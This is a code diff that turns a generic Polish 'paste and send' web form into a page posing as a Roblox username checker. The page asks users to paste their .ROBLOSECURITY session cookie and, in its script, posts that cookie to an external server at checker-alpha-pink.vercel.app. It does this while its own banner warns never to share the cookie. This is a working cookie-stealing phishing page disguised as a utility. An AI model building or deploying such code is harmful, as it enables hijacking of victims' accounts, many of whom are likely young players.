@@ -1,106 +1,68 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Wklej → Wyślij</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox – nazwa z .ROBLOSECURITY</title>
   <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      background: #0d1117;
-      color: #e6edf3;
-      margin: 0;
-      padding: 2rem;
-      max-width: 700px;
-      margin: 0 auto;
-    }
-    h1 { color: #58a6ff; }
-    textarea {
-      width: 100%;
-      min-height: 160px;
-      background: #161b22;
-      color: #c9d1d9;
-      border: 1px solid #30363d;
-      border-radius: 6px;
-      padding: 12px;
-      font-family: 'Consolas', 'Courier New', monospace;
-      font-size: 15px;
-      resize: vertical;
-      margin: 1rem 0 1.5rem;
-    }
-    button {
-      background: #238636;
-      color: white;
-      border: none;
-      padding: 0.8rem 1.8rem;
-      font-size: 1.1rem;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: 0.15s;
-    }
-    button:hover { background: #2ea043; }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
-    #info {
-      margin-top: 1.5rem;
-      min-height: 1.5rem;
-      font-weight: 500;
-    }
-    .ok    { color: #3fb950; }
-    .error { color: #f85149; }
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    textarea { width: 100%; height: 120px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; }
+    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; }
+    button:hover { background: #0c7ae6; }
+    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 80px; }
+    .error { color: #ff4d4d; }
+    .success { color: #00ff9d; }
   </style>
 </head>
 <body>
 
-<h1>Wklej i wyślij</h1>
+<h2>Pobierz nazwę użytkownika Roblox z cookie</h2>
+<p style="color:#ffcc00;"><strong>OSTRZEŻENIE:</strong> .ROBLOSECURITY to klucz do konta – NIGDY nie wysyłaj go nikomu!</p>
 
-<textarea id="tresc" placeholder="Wklej tutaj tekst, kod, logi..."></textarea>
+<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 
-<button id="btn">Wyślij</button>
+<br>
+<button onclick="sprawdz()">Sprawdź</button>
 
-<div id="info"></div>
+<div id="result"></div>
 
 <script>
-const ENDPOINT = "/api/wyslij";           // ← Twój endpoint na Vercel
-const btn = document.getElementById("btn");
-const txt = document.getElementById("tresc");
-const info = document.getElementById("info");
+async function sprawdz() {
+  const cookieVal = document.getElementById('cookie').value.trim();
+  const result = document.getElementById('result');
+  result.innerHTML = '';
 
-btn.addEventListener("click", async () => {
-  const tekst = txt.value.trim();
-  if (!tekst) {
-    pokaz("Nic nie wpisano", "error");
+  if (cookieVal.length < 200) {
+    result.innerHTML = '<span class="error">Wklej poprawne cookie!</span>';
     return;
   }
 
-  btn.disabled = true;
-  btn.textContent = "Wysyłam...";
-  pokaz("Trwa wysyłanie...", "");
+  result.innerHTML = '<i>Proszę czekać...</i>';
 
   try {
-    const res = await fetch(ENDPOINT, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ tekst })
+    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie: cookieVal })
     });
 
-    if (res.ok) {
-      pokaz("Wysłano pomyślnie ✓", "ok");
-      txt.value = "";
-    } else {
-      const err = await res.text().catch(() => "");
-      pokaz(`Błąd: ${res.status} ${err.slice(0,80)}`, "error");
-    }
-  } catch (err) {
-    pokaz(`Połączenie nie udało się: ${err.message}`, "error");
-  } finally {
-    btn.disabled = false;
-    btn.textContent = "Wyślij";
-  }
-});
+    const json = await resp.json();
 
-function pokaz(tresc, klasa = "") {
-  info.textContent = tresc;
-  info.className = klasa;
+    if (json.error) {
+      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
+    } else if (json.success) {
+      result.innerHTML = `
+        <span class="success">Zalogowano pomyślnie!</span><br><br>
+        <b>Nazwa użytkownika:</b> ${json.username}<br>
+        <b>Display Name:</b> ${json.displayName}<br>
+        <b>User ID:</b> ${json.userId}
+      `;
+    } else {
+      result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
+    }
+  } catch (e) {
+    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
+  }
 }
 </script>
 
